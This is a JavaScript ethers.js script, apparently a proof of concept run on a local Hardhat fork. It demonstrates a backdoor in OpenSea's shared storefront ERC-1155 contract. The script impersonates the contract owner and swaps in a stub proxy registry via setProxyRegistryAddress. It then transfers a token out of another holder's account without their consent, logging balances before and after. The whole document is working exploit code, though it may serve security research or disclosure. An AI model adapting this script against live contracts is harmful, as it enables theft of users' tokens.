import { ethers } from "ethers";
import fs from "fs";

const provider = new ethers.providers.JsonRpcProvider("http://127.0.0.1:8545/");
const backdoorAccount = "0xC669B5F25F03be2ac0323037CB57f49eB543657a";
const aTokenID = "46038921131323814396335747090004559834868014221610645288463784344990987059201";
const tokenOwner = "0xE34228f210354911c0FedAD9941c7Cfd269B9E91";
const tokenRecipient = "0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
let signer;

// Impersonate signer //////////////////////////////////////////////////////////////////////////////////////////////////
const accountToImpersonate = backdoorAccount;
await provider.send("hardhat_impersonateAccount", [accountToImpersonate]);
await provider.send("hardhat_setBalance", [accountToImpersonate, "0x1000000000000000000"]);
signer = provider.getSigner(accountToImpersonate);

// OpenSea shared storefront contract //////////////////////////////////////////////////////////////////////////////////
const sharedStorefrontAddress = "0x495f947276749ce646f68ac8c248420045cb7b5e";
const sharedStorefrontABI = [
    // Backdoor stuff
    "function owner() view returns (address)",
    "function setProxyRegistryAddress(address proxyRegistryAddress)",

    // ERC-1155 stuff
    "function balanceOf(address _owner, uint256 _id) view returns (uint256)",
    "function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes calldata data)",
    "event TransferSingle(address indexed operator, address indexed from, address indexed to, uint256 id, uint256 value)",
];
const sharedStorefront = new ethers.Contract(sharedStorefrontAddress, sharedStorefrontABI, signer);
const contractOwner = await sharedStorefront.owner();
console.log("Storefront (ERC-1155):", sharedStorefrontAddress);
console.log("Contract owner:       ", contractOwner);
console.log("Token ID:             ", aTokenID);
console.log("Token owner:          ", tokenOwner);

// Proxy registry stub /////////////////////////////////////////////////////////////////////////////////////////////////
const proxyRegistryStubABI = JSON.parse(fs.readFileSync("./proxyRegistryStubABI.json"));
const proxyRegistryStubBytecode = JSON.parse(fs.readFileSync("./proxyRegistryStubBytecode.json"));
const proxyRegistryStubFactory = new ethers.ContractFactory(proxyRegistryStubABI, proxyRegistryStubBytecode, signer);
const proxyRegistryStub = await proxyRegistryStubFactory.deploy();
await proxyRegistryStub.deployed();
console.log("Proxy registry stub:  ", proxyRegistryStub.address);
await sharedStorefront.setProxyRegistryAddress(proxyRegistryStub.address, { gasLimit: 1000000 });

// Attempt to transfer token ///////////////////////////////////////////////////////////////////////////////////////////
// Balance before
const senderBalanceBefore = await sharedStorefront.balanceOf(tokenOwner, aTokenID);
console.log("Sender balance:       ", senderBalanceBefore.toString());
const recipientBalanceBefore = await sharedStorefront.balanceOf(tokenRecipient, aTokenID);
console.log("Recipient balance:    ", recipientBalanceBefore.toString());

// Transfer token
const tx = await sharedStorefront.safeTransferFrom(tokenOwner, tokenRecipient, aTokenID, 1, "0x", { gasLimit: 1000000 });
const receipt = await tx.wait();
console.log("Transaction hash:     ", receipt.transactionHash);
console.log("Transaction logs:     ", receipt.logs);

// Balance after
const senderBalanceAfter = await sharedStorefront.balanceOf(tokenOwner, aTokenID);
console.log("Sender balance:       ", senderBalanceAfter.toString());
const recipientBalanceAfter = await sharedStorefront.balanceOf(tokenRecipient, aTokenID);
console.log("Recipient balance:    ", recipientBalanceAfter.toString());
